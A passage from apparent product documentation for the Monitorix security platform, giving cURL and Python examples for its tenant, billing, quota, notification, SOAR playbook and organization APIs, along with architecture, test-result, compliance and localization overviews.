  -d '{"Name":"Monitorix Global Security","Plan":"Enterprise","AgentLimit":1000}'
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/tenants/1'
headers = {'Authorization': f'Bearer {jwt_token}', 'Content-Type': 'application/json'}
payload = {'Name': 'Monitorix Global Security', 'Plan': 'Enterprise', 'AgentLimit': 1000}
res = requests.put(url, json=payload, headers=headers)
print(res.json())
```

### `DELETE` /api/tenants/{tenant_id}
Deletes a tenant entity, terminates all associated sessions, and writes an audit event.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`

**Request Body**:
```json
None
```
**Response 200 OK**:
```json
{
  "status": "success",
  "message": "Tenant 'Test Org' (ID: 15) successfully deleted."
}
```
**cURL Command**:
```bash
curl -X DELETE https://monitorix.elsea.co.in/api/tenants/15 \
  -H "Authorization: Bearer $JWT_TOKEN"
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/tenants/15'
headers = {'Authorization': f'Bearer {jwt_token}'}
res = requests.delete(url, headers=headers)
print(res.json())
```

### `POST` /api/billing/update-plan
Directly updates and persists tenant subscription plan and quota in sovereign air-gapped mode.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`
* `Content-Type: application/json`

**Request Body**:
```json
{
  "tenant_id": 1,
  "PlanName": "Sovereign"
}
```
**Response 200 OK**:
```json
{
  "TenantId": 1,
  "Plan": "Sovereign",
  "AgentLimit": 5000,
  "NextBillingDate": "2027-01-01T00:00:00",
  "AmountDue": 299.99,
  "SubscriptionStatus": "active"
}
```
**cURL Command**:
```bash
curl -X POST https://monitorix.elsea.co.in/api/billing/update-plan \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"tenant_id": 1, "PlanName": "Sovereign"}'
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/billing/update-plan'
headers = {'Authorization': f'Bearer {jwt_token}', 'Content-Type': 'application/json'}
payload = {'tenant_id': 1, 'PlanName': 'Sovereign'}
res = requests.post(url, json=payload, headers=headers)
print(res.json())
```

### `PUT` /api/v2/saas/subscriptions/quotas
Configures granular custom resource quotas (Endpoints, Storage GB, EPS Ingestion, API RPM).

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`
* `Content-Type: application/json`

**Request Body**:
```json
{
  "max_endpoints": 250,
  "max_storage_gb": 500,
  "max_events_per_sec": 7500,
  "api_rate_limit_rpm": 1200
}
```
**Response 200 OK**:
```json
{
  "status": "success",
  "subscription": {
    "tenant_id": 1,
    "quotas": {
      "endpoint_limit": 100000,
      "storage_quota_gb": 50000,
      "api_rate_limit_rpm": 1200
    }
  }
}
```
**cURL Command**:
```bash
curl -X PUT 'https://monitorix.elsea.co.in/api/v2/saas/subscriptions/quotas?tenant_id=1' \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"max_endpoints": 250, "max_storage_gb": 500, "api_rate_limit_rpm": 1200}'
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/v2/saas/subscriptions/quotas'
headers = {'Authorization': f'Bearer {jwt_token}', 'Content-Type': 'application/json'}
res = requests.put(url, params={'tenant_id': 1}, json={'api_rate_limit_rpm': 1200}, headers=headers)
print(res.json())
```

### `PUT` /api/v2/saas/notifications/{channel_id}
Updates destination webhook, severity filtering, or channel name for enterprise notifications.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`
* `Content-Type: application/json`

**Request Body**:
```json
{
  "name": "SecOps Alerts Slack",
  "destination": "https://hooks.slack.com/services/updated/monitorix",
  "filter_severity": "High"
}
```
**Response 200 OK**:
```json
{
  "status": "success",
  "channel": {
    "id": 4,
    "channel_type": "Slack",
    "channel_name": "SecOps Alerts Slack",
    "filter_severity": "High",
    "is_enabled": true
  }
}
```
**cURL Command**:
```bash
curl -X PUT https://monitorix.elsea.co.in/api/v2/saas/notifications/4 \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "SecOps Alerts Slack", "filter_severity": "High"}'
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/v2/saas/notifications/4'
headers = {'Authorization': f'Bearer {jwt_token}', 'Content-Type': 'application/json'}
res = requests.put(url, json={'name': 'SecOps Alerts Slack'}, headers=headers)
print(res.json())
```

### `DELETE` /api/v2/saas/notifications/{channel_id}
Removes an enterprise notification channel by ID.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`

**Request Body**:
```json
None
```
**Response 200 OK**:
```json
{
  "status": "success",
  "message": "Channel #4 successfully deleted"
}
```
**cURL Command**:
```bash
curl -X DELETE https://monitorix.elsea.co.in/api/v2/saas/notifications/4 \
  -H "Authorization: Bearer $JWT_TOKEN"
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/v2/saas/notifications/4'
headers = {'Authorization': f'Bearer {jwt_token}'}
res = requests.delete(url, headers=headers)
print(res.json())
```

### `PUT` /api/v2/soar/playbooks/{playbook_id}
Modifies automated incident response playbook actions, triggers, and approval requirements.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`
* `Content-Type: application/json`

**Request Body**:
```json
{
  "name": "Automated Ransomware Containment (v2)",
  "trigger_condition": "ransomware_detected_critical",
  "actions": [
    {"action": "dump_memory", "params": {"target": "c:\\temp\\dump.dmp"}},
    {"action": "isolate_host", "params": {"network": "disabled"}}
  ]
}
```
**Response 200 OK**:
```json
{
  "status": "success",
  "name": "Automated Ransomware Containment (v2)"
}
```
**cURL Command**:
```bash
curl -X PUT https://monitorix.elsea.co.in/api/v2/soar/playbooks/7 \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Automated Ransomware Containment (v2)","trigger_condition":"ransomware_detected_critical","actions":[{"action":"isolate_host"}]}'
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/v2/soar/playbooks/7'
headers = {'Authorization': f'Bearer {jwt_token}', 'Content-Type': 'application/json'}
payload = {'name': 'Automated Ransomware Containment (v2)', 'trigger_condition': 'ransomware_detected_critical', 'actions': [{'action': 'isolate_host'}]}
res = requests.put(url, json=payload, headers=headers)
print(res.json())
```

### `DELETE` /api/v2/soar/playbooks/{playbook_id}
Deletes an automated SOAR playbook.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`

**Request Body**:
```json
None
```
**Response 200 OK**:
```json
{
  "status": "success",
  "message": "Playbook #7 deleted"
}
```
**cURL Command**:
```bash
curl -X DELETE https://monitorix.elsea.co.in/api/v2/soar/playbooks/7 \
  -H "Authorization: Bearer $JWT_TOKEN"
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/v2/soar/playbooks/7'
headers = {'Authorization': f'Bearer {jwt_token}'}
res = requests.delete(url, headers=headers)
print(res.json())
```

### `PUT` /api/v2/saas/organizations/{org_id}
Updates global enterprise organization attributes, primary contact, and data residency jurisdiction.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`
* `Content-Type: application/json`

**Request Body**:
```json
{
  "name": "Monitorix Global Enterprise",
  "data_residency": "Global-Sovereign"
}
```
**Response 200 OK**:
```json
{
  "status": "success",
  "organization": {
    "id": 9,
    "name": "Monitorix Global Enterprise",
    "data_residency": "Global-Sovereign"
  }
}
```
**cURL Command**:
```bash
curl -X PUT https://monitorix.elsea.co.in/api/v2/saas/organizations/9 \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Monitorix Global Enterprise","data_residency":"Global-Sovereign"}'
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/v2/saas/organizations/9'
headers = {'Authorization': f'Bearer {jwt_token}', 'Content-Type': 'application/json'}
res = requests.put(url, json={'name': 'Monitorix Global Enterprise', 'data_residency': 'Global-Sovereign'}, headers=headers)
print(res.json())
```


---
## 10. Production CRUD Operations & Subscription Plan Management
Complete operational reference for all interactive Create (Insert), Read, Update (Save), and Delete flows across tenants, sovereign billing, custom resource quotas, SOAR playbooks, and notification channels.

### 🔄 Tenant Lifecycle & Plan Tiering Management
* **Subsystem**: Administration & Multi-Tenancy (Module 08)
* **Frontend Page**: [`watch-sec-frontend/src/pages/Tenants.tsx`](file:///watch-sec-frontend/src/pages/Tenants.tsx)
* **Architecture Description**: End-to-end multi-tenant governance. Enables creating new enterprise organizations with tailored subscription tiers, editing active quotas, and hard-deleting tenants with session invalidation.

| Operation Type | API Endpoint | Operational Flow & User Interaction |
| :--- | :--- | :--- |
| **INSERT (Create Tenant)** | `POST /api/tenants` | Tenant creation bar with company name input and interactive plan tier selector (Starter: 5 agents, Professional: 50 agents, Enterprise: 1,000 agents, Sovereign: 5,000 agents). Sends flexible payload { name, plan, agent_limit } and immediately updates the live fleet registry. |
| **READ (List Tenants)** | `GET /api/tenants` | Fetches all multi-tenant boundary profiles with cryptographic API keys, plan tiers, agent limits, and active status indicators. |
| **UPDATE (Save/Edit Plan)** | `PUT /api/tenants/{tenant_id}` | Triggered via 'Edit Plan' button on tenant cards. Opens interactive configuration modal allowing administrators to modify company name, upgrade/downgrade subscription tier, and tune agent limit ceilings. |
| **DELETE (Hard Delete)** | `DELETE /api/tenants/{tenant_id}` | Triggered via 'Delete' action button with confirmation modal. Safely purges tenant record, terminates active agent sessions, and writes an immutable entry into AuditLog. |

> **Verification**: Verified 100% in test_comprehensive_crud_endpoints.py [Test 1/7]

### 🔄 Sovereign Billing & Direct Plan Updates
* **Subsystem**: Commercial & Metering (Module 12)
* **Frontend Page**: [`watch-sec-frontend/src/pages/Billing.tsx`](file:///watch-sec-frontend/src/pages/Billing.tsx)
* **Architecture Description**: Air-gapped and sovereign subscription tier switching without mandatory external payment gateways. Direct database persistence guarantees high-assurance deployments operate without internet dependencies.

| Operation Type | API Endpoint | Operational Flow & User Interaction |
| :--- | :--- | :--- |
| **UPDATE (Direct Plan Switch)** | `POST /api/billing/update-plan` | 1-click plan selection buttons on pricing cards invoke handleDirectPlanUpdate. Persists tier upgrade directly to PostgreSQL Tenants table, dynamically scales AgentLimit (Starter: 5, Professional: 50, Enterprise: 1,000, Sovereign: 5,000), and emits UI toast notification. |
| **READ (Subscription State)** | `GET /api/billing` | Loads current plan tier, agent limit, enrolled agent count, billing cycle timestamp, and invoice totals. |

> **Verification**: Verified 100% in test_comprehensive_crud_endpoints.py [Test 2/7]

### 🔄 Custom Resource Quota & Subscription Management
* **Subsystem**: SaaS & Subscriptions (Module 10)
* **Frontend Page**: [`watch-sec-frontend/src/pages/AdminSubscriptions.tsx & AdminQuotas.tsx`](file:///watch-sec-frontend/src/pages/AdminSubscriptions.tsx & AdminQuotas.tsx)
* **Architecture Description**: Granular resource quota governance across enterprise compute, storage, throughput, and rate limiting. Eliminates hardcoded tenant identifiers via dynamic JWT user session resolution.

| Operation Type | API Endpoint | Operational Flow & User Interaction |
| :--- | :--- | :--- |
| **UPDATE (Custom Quotas)** | `PUT /api/v2/saas/subscriptions/quotas` | Triggered via 'Customize Quotas' button. Opens dedicated modal providing live inputs for Max Endpoints, Storage Quota (GB), Ingestion EPS, and API Rate Limit RPM. Persists updates per tenant. |
| **UPDATE (Global Admin Quotas)** | `PUT /api/v2/saas/admin/quotas` | SuperAdmin system-wide quota overrides for high-scale enterprise clusters. |
| **READ (Quota Metering)** | `GET /api/v2/saas/subscriptions & /admin/quotas` | Presents real-time progress bars showing allocated vs consumed quotas, percentage utilization, and health state indicators. |

> **Verification**: Verified 100% in test_comprehensive_crud_endpoints.py [Test 3/7 & 4/7]

### 🔄 Multi-Channel Notification Router
* **Subsystem**: Alerting & Dispatch (Module 10)
* **Frontend Page**: [`watch-sec-frontend/src/pages/AdminQuotas.tsx`](file:///watch-sec-frontend/src/pages/AdminQuotas.tsx)
* **Architecture Description**: Omni-channel security alerting infrastructure routing P1/P2 incidents to external SecOps tools with case-insensitive channel type resolution.

| Operation Type | API Endpoint | Operational Flow & User Interaction |
| :--- | :--- | :--- |
| **INSERT (Create Channel)** | `POST /api/v2/saas/notifications` | Registers notification endpoints across Slack, Webhook, Email, Push, PagerDuty, or InApp. Supports custom channel names and severity thresholds. |
| **READ (List Channels)** | `GET /api/v2/saas/notifications` | Retrieves all configured notification dispatchers for the active tenant. |
| **UPDATE (Save Channel)** | `PUT /api/v2/saas/notifications/{channel_id}` | Action button on channel card opens Edit Modal allowing modifying destination URI, alert severity filters, and broadcast toggle. |
| **DELETE (Delete Channel)** | `DELETE /api/v2/saas/notifications/{channel_id}` | Removes notification channel with instant UI update and toast confirmation. |

> **Verification**: Verified 100% in test_comprehensive_crud_endpoints.py [Test 5/7]

### 🔄 SOAR Automated Remediation Playbooks
* **Subsystem**: Autonomous Security & SOAR (Module 01 & 06)
* **Frontend Page**: [`watch-sec-frontend/src/pages/SoarPlaybooks.tsx`](file:///watch-sec-frontend/src/pages/SoarPlaybooks.tsx)
* **Architecture Description**: Visual automation workflow builder executing multi-step containment actions (host isolation, process termination, memory dumping) upon alert conditions.

| Operation Type | API Endpoint | Operational Flow & User Interaction |
| :--- | :--- | :--- |
| **INSERT (Deploy Playbook)** | `POST /api/v2/soar/playbooks` | Builder allows defining trigger conditions, chained remediation steps, and dual-authorization flags. |
| **READ (List Playbooks)** | `GET /api/v2/soar/playbooks` | Lists active automation playbooks with execution counts and step summaries. |
| **UPDATE (Edit Playbook)** | `PUT /api/v2/soar/playbooks/{playbook_id}` | Clicking 'Edit' on any playbook card loads definition into builder with live step editing and updates via PUT. |
| **DELETE (Delete Playbook)** | `DELETE /api/v2/soar/playbooks/{playbook_id}` | Deletes playbook from active automation registry with safety confirmation. |

> **Verification**: Verified 100% in test_comprehensive_crud_endpoints.py [Test 6/7]

### 🔄 Multi-Organization Enterprise Management
* **Subsystem**: Global Platform & Residency (Module 10 & 13)
* **Frontend Page**: [`watch-sec-frontend/src/pages/AdminOrganizations.tsx`](file:///watch-sec-frontend/src/pages/AdminOrganizations.tsx)
* **Architecture Description**: Parent enterprise management enforcing regulatory data residency per organization (EU-GDPR, US-East, Global-Sovereign).

| Operation Type | API Endpoint | Operational Flow & User Interaction |
| :--- | :--- | :--- |
| **INSERT (Create Org)** | `POST /api/v2/saas/organizations` | Registers parent organization with region and residency compliance policies. |
| **READ (List Orgs)** | `GET /api/v2/saas/organizations` | Lists enterprise organizations with tenant counts and status. |
| **UPDATE (Edit Org)** | `PUT /api/v2/saas/organizations/{org_id}` | Edit button opens modal updating organization name, primary contact email, assigned region, and data residency boundary. |

> **Verification**: Verified 100% in test_comprehensive_crud_endpoints.py [Test 7/7]


---
## 11. Ring 0 to Ring 3 Kernel Driver Internals
### Windows Minifilter Driver (`monitorix.sys`)
* Registers with Filter Manager via `FltRegisterFilter`.
* Intercepts pre/post operation callbacks for `IRP_MJ_CREATE` and `IRP_MJ_WRITE`.
* Inverted call communication channel over `FilterConnectCommunicationPort`.

### Linux eBPF Sensor (CO-RE)
* Compile Once - Run Everywhere (CO-RE) bytecode.
* Low-latency lockless ring buffer (`BPF_MAP_TYPE_RINGBUF`).
* Attaches to kernel tracepoints (`sys_enter_execve`, `sock:inet_sock_set_state`).

### macOS Endpoint Security Framework (ESF)
* Subscribes to `ES_EVENT_TYPE_AUTH_EXEC` and `ES_EVENT_TYPE_AUTH_OPEN` via `es_new_client`.
* Apple Silicon entitlement verification prevents TCC privacy bypasses.

---
## 12. Master Multi-Tier & Domain Architectures
* **Platform Master Blueprint**: [`platform_master_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/platform_master_architecture.jpg)
* **Multi-Level 6-Tier Architecture**: [`multilevel_system_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/multilevel_system_architecture.jpg)
* **Domain Protection Lifecycle**: [`domain_protection_lifecycle_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/domain_protection_lifecycle_architecture.jpg)
* **7-Stage Data Pipeline**: [`data_transaction_pipeline.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/data_transaction_pipeline.jpg)
* **Windows Agent Architecture**: [`windows_agent_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/windows_agent_architecture.jpg)
* **Linux Agent Architecture**: [`linux_agent_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/linux_agent_architecture.jpg)

---
## 13. Business ROI, Data Integrity & Acceptance Accreditation
### Quantitative Loss Avoidance & Compliance Posture
* **Financial Loss Avoidance**: $1.85M average enterprise ransomware extortion and recovery cost eliminated.
* **Regulatory Safeguard**: European Union GDPR (Art. 44), US HIPAA, and India DPDP Act compliance guaranteed with zero cross-border telemetry leakage.
* **100% Sovereign Air-Gap Invariant**: Zero external cloud or SaaS dependencies; fully functional in self-hosted, sovereign, and disconnected data centers.

### Production Test Suite Accreditation
| Test Suite | Scope & Target Capabilities | Accreditation Result | Status |
| :--- | :--- | :--- | :--- |
| **Frontend CRUD & Plan Verification** | Tenants CRUD, Sovereign Billing, Custom Quotas, Notifications CRUD, SOAR Playbooks CRUD, Organizations Update | **7/7 Passed (100%)** | `PASSED` |
| **Data Integrity & Credential Hardening** | Plaintext Key Elimination, AES-256-GCM Encryption, Kafka DLQ Manual Commits, Automated MinIO DR, Real-Time DLP | **10/10 Passed (100%)** | `PASSED` |
| **Consolidated Acceptance Suites** | Enterprise EDR, NDR, WAAP, CNAPP, DSPM, ITDR, EASM, SOAR, UEBA, Cyber Range, Scale Benchmarking | **21/21 Passed (100%)** | `PASSED` |
| **Global Compliance Acceptance** | 32 Statutory Regulations, Verhoeff/Luhn/Mod-11 Checksums, Asynchronous Scans, Multi-Tenant Posture | **83/83 Passed (100%)** | `PASSED` |


---
## 14. Sovereign Geospatial Architecture & React Leaflet Stack
Monitorix eliminates external map dependencies (e.g. Carto, Google Maps, Mapbox) that require external API keys, enforce usage watermarks, or leak customer geographic queries.

### Key Architectural Pillars:
* **Engine**: React Leaflet (`react-leaflet` ^5.0.0, `leaflet` ^1.9.4) providing hardware-accelerated interactive canvas and SVG rendering.
* **Zero-API-Key Sovereign Basemaps**: Fully compatible with offline/air-gapped and direct sovereign deployments:
  * **Esri World Streets**: High-detail operational street basemap (`World_Street_Map/MapServer`).
  * **Esri Dark Gray Canvas**: High-contrast cyber telemetry basemap (`Canvas/World_Dark_Gray_Base` and `World_Dark_Gray_Reference`).
  * **Esri Light Gray Canvas**: Neutral reference canvas for daylight executive operations.
  * **OpenStreetMap (OSM)**: Standard decentralized crowd-sourced global map layer.
* **Dynamic Telemetry Clustering**: Pins map directly to enrolled fleet agents with native OS coordinates or sovereign subnet triangulation.
* **Dynamic Cyber Threat Trajectories**: Great-circle spherical interpolation connects active endpoints and correlated threat vectors dynamically.
* **Executive Command Hero Layout**: Seamless gradient alpha-masking blends the cyber command telemetry panel organically into the interactive world map.


---
## 15. 100% Real-Time Dynamic Telemetry & Zero Mock Data Guarantee
All synthetic demo arrays, mock sensor constants, and pseudo-random generators (`Math.random()`) have been eliminated across the entire platform.

### Live Telemetry Streaming Pipeline:
| Component | Underlying Data Engine | Ingestion / Processing Flow |
| :--- | :--- | :--- |
| **Fleet Coordinates & Telemetry** | PostgreSQL `Agents` & `AgentReports` | Direct DB queries via `/api/agents` and `/api/dashboard/stats` |
| **SIEM & Security Events** | ClickHouse `EventLogs` & Kafka Streams | Real-time ingest via `aiokafka` consumer into columnar event lake |
| **Activity Lake & Forensics** | MongoDB `activity` Collection | Microsecond process spawns, socket events, and FIM hash verification |
| **Session & Rate Limiting** | Redis Cache & Pub/Sub | Real-time token revocation, rate limiting, and agent heartbeat state |
| **Live UI State Streaming** | WebSocket / Socket.IO | Instant broadcasts on `agent_registered`, `agent_disconnected`, and status updates |


---
## 16. Global Compliance Center & 32 Statutory Regulatory Frameworks
Automated continuous audit, posture scoring, and mathematical PII classification across 32 statutory international and sovereign standards.

### 32 Supported Compliance Frameworks:
1. **DPDP_INDIA**: India Digital Personal Data Protection Act 2023
2. **GDPR**: European Union General Data Protection Regulation (Regulation (EU) 2016/679)
3. **HIPAA**: US Health Insurance Portability and Accountability Act (Security & Privacy Rules)
4. **PCI_DSS**: Payment Card Industry Data Security Standard v4.0
5. **NIST_800_53**: NIST Special Publication 800-53 Rev. 5 (Moderate / High Baselines)
6. **ISO_27001**: ISO/IEC 27001:2022 Information Security Management Systems
7. **SOC2_TYPE2**: AICPA SOC 2 Type II Trust Services Criteria
8. **RBI_CSF**: Reserve Bank of India Cyber Security Framework for Banks
9. **FEDRAMP_HIGH**: Federal Risk and Authorization Management Program High Baseline
10. **SAUDI_NCA_ECC**: Saudi Arabia National Cybersecurity Authority Essential Cybersecurity Controls (ECC-1:2018)
11. **UAE_NESA**: United Arab Emirates National Electronic Security Authority IAS
12. **CCPA_CPRA**: California Consumer Privacy Act / Privacy Rights Act
13. **LGPD_BRAZIL**: Brazil Lei Geral de Proteção de Dados (Lei nº 13.709/2018)
14. **PIPEDA_CANADA**: Canada Personal Information Protection and Electronic Documents Act
15. **AUSTRALIA_PRIVACY**: Australia Privacy Act 1988 & Australian Privacy Principles
16. **SINGAPORE_PDPA**: Singapore Personal Data Protection Act 2012
17. **JAPAN_APPI**: Japan Act on the Protection of Personal Information
18. **SOUTH_AFRICA_POPIA**: South Africa Protection of Personal Information Act
19. **QATAR_PDPPL**: Qatar Personal Data Privacy Protection Law (Law No. 13 of 2016)
20. **TURKEY_KVKK**: Turkey Personal Data Protection Law (Law No. 6698)
21. **BAHRAIN_PDPL**: Bahrain Personal Data Protection Law (Law No. 30 of 2018)
22. **KENYA_DPA**: Kenya Data Protection Act 2019
23. **NIGERIA_NDPR**: Nigeria Data Protection Regulation 2019
24. **SWISS_FADP**: Switzerland Federal Act on Data Protection (Revised FADP 2023)
25. **NEW_ZEALAND_PA**: New Zealand Privacy Act 2020
26. **ISRAEL_PPL**: Israel Protection of Privacy Law 5741-1981
27. **THAILAND_PDPA**: Thailand Personal Data Protection Act B.E. 2562 (2019)
28. **INDONESIA_PDP**: Indonesia Personal Data Protection Law (Law No. 27 of 2022)
29. **MALAYSIA_PDPA**: Malaysia Personal Data Protection Act 2010 (Act 709)
30. **PHILIPPINES_DPA**: Philippines Data Privacy Act of 2012 (Republic Act No. 10173)
31. **SOUTH_KOREA_PIPA**: South Korea Personal Information Protection Act
32. **COLOMBIA_LAW_1581**: Colombia General Data Protection Regime (Ley Estatutaria 1581 de 2012)

### Mathematical PII Checksum Algorithms:
* **Verhoeff Dihedral D8 Checksum**: Indian Aadhaar (12-digit) validation prevents transposition errors.
* **Luhn Modulo 10 Algorithm**: Canadian SIN (Social Insurance Number) and Saudi National ID validation.
* **Modulo 11 Weighted Algorithms**: UK NHS numbers, Brazil CPF (dual check digits), New Zealand IRD, and Chile RUT/RUN.
* **EAN-13 Barcode Algorithm**: Swiss AHV/AVS 13-digit social security identifier.

### Compliance Accreditation:
| Metric | Result | Target Benchmark | Status |
| :--- | :--- | :--- | :--- |
| **Statutory Regulations Covered** | **32 / 32** | 32 Global Standards | `ACCREDITED` |
| **Compliance Acceptance Tests** | **83 / 83 Passed (100%)** | 100% Pass Rate | `PASSED` |
| **Consolidated Regression Suites** | **21 / 21 Passed (100%)** | 100% Pass Rate | `PASSED` |


---
## 17. Sovereign Country-Based Localization & Multi-Language Architecture
Monitorix Enterprise delivers native multi-language translation and country-based jurisdiction mapping without relying on third-party cloud translation APIs.

### Key Architectural Tenets:
* **100% Air-Gapped & In-Memory Localization**: Zero external API calls to Google Translate, Microsoft Azure Cognitive Services, or DeepL. Translation tokenizers and dictionaries execute entirely in-browser and on sovereign premises, eliminating data exfiltration risks.
* **Zero-Leakage Client-Side Country Detection**: Automatically determines country and language using client-side heuristics (`navigator.language`, `navigator.languages`, and `Intl.DateTimeFormat` timezone nodes) without making external GeoIP network queries.
* **Full Bi-Directional Typography & RTL Support**: Native Right-to-Left (RTL) script support for Arabic (`ar-SA`, `ar-AE`, `ar-QA`), complete with CSS logical properties (`margin-inline-start`, `padding-inline-end`) for Middle Eastern sovereign defense operations.
* **Jurisdiction & Statutory Mapping**:
  * 🇺🇸 **United States (`en-US`)**: NIST SP 800-53, HIPAA, FedRAMP High, SOC 2 Type II
  * 🇬🇧 **United Kingdom (`en-GB`)**: UK Data Protection Act 2018 / UK GDPR
  * 🇮🇳 **India (`hi-IN` / `en-IN`)**: DPDP Act 2023, RBI Cyber Security Framework, CERT-In
  * 🇩🇪 **Germany (`de-DE`)**: EU GDPR (DSGVO), BSI IT-Grundschutz
  * 🇫🇷 **France (`fr-FR`)**: EU GDPR (RGPD), CNIL, ANSSI
  * 🇪🇸 **Spain (`es-ES`)**: EU GDPR (RGPD), Esquema Nacional de Seguridad (ENS)
  * 🇸🇦 **Saudi Arabia (`ar-SA`)**: Saudi NCA Essential Cybersecurity Controls (ECC-1:2018)
  * 🇦🇪 **United Arab Emirates (`ar-AE`)**: UAE NESA Information Assurance Standards
  * 🇧🇷 **Brazil (`pt-BR`)**: Lei Geral de Proteção de Dados (LGPD)
  * 🇯🇵 **Japan (`ja-JP`)**: Act on the Protection of Personal Information (APPI)
  * 🇨🇳 **China (`zh-CN`)**: Personal Information Protection Law (PIPL) & Cyber Security Law
  * 🇰🇷 **South Korea (`ko-KR`)**: Personal Information Protection Act (PIPA)
  * 🇮🇹 **Italy (`it-IT`)**: EU GDPR, Garante Privacy
  * 🇨🇦 **Canada (`en-CA` / `fr-CA`)**: Personal Information Protection and Electronic Documents Act (PIPEDA)
  * 🇸🇬 **Singapore (`en-SG`)**: Personal Data Protection Act (PDPA)
  * 🇦🇺 **Australia (`en-AU`)**: Australian Privacy Principles (Privacy Act 1988)
  * 🇨🇭 **Switzerland (`de-CH` / `fr-CH`)**: Revised Federal Act on Data Protection (FADP 2023)
  * 🇹🇷 **Turkey (`tr-TR`)**: Law on Protection of Personal Data (KVKK)

